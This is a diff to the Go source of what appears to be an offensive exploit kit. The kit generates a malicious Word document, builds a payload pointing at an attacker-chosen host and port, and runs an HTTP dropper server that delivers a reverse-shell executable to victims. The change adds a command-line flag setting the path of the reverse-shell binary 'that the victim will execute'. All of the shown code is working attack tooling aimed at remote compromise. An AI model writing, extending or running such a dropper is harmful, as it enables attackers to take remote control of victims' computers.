@@ -15,18 +15,19 @@ import (
 )
 
 func main() {
-	url, port := initArgs()
+	url, port, revshellpath := initArgs()
 	payload_url := "http://" + url + ":" + port
 	createMaliciousDocx(payload_url)
 	createPayload(payload_url)
-	hostDropper(port)
+	hostDropper(port, revshellpath)
 }
 
-func initArgs() (string, string) {
-	url := flag.String("url", "localhost", "The hostname or IP address where the generated document should retrieve your payload, defaults to \"localhost\".")
-	port := flag.String("port", "80", "The port to run the HTTP server on, defaults to 80")
+func initArgs() (string, string, string) {
+	url := flag.String("url", "localhost", "The hostname or IP address where the generated document should retrieve your payload")
+	port := flag.String("port", "80", "The port to run the HTTP server on")
+	revshellpath := flag.String("shell", "tmp/Go-RevShell.exe", "The local path to the reverse shell exe that the victim will execute")
 	flag.Parse()
-	return *url, *port
+	return *url, *port, *revshellpath
 }
 
 func createMaliciousDocx(payload_url string) {
@@ -85,7 +86,7 @@ func generateRandomString(length int) string {
 	return string(random_string)
 }
 
-func hostDropper(port string) {
+func hostDropper(port, revshellpath string) {
 	println("[+] Hosting payload on port :" + port)
 	http.HandleFunc("/payload.html", func(w http.ResponseWriter, r *http.Request) {
 		print("a")
@@ -93,7 +94,7 @@ func hostDropper(port string) {
 	})
 	http.HandleFunc("/poop.exe", func(w http.ResponseWriter, r *http.Request) {
 		println("'btdfr")
-		http.ServeFile(w, r, "tmp/Go-RevShell.exe")
+		http.ServeFile(w, r, revshellpath)
 	})
 	http.ListenAndServe(":"+port, nil)
 }
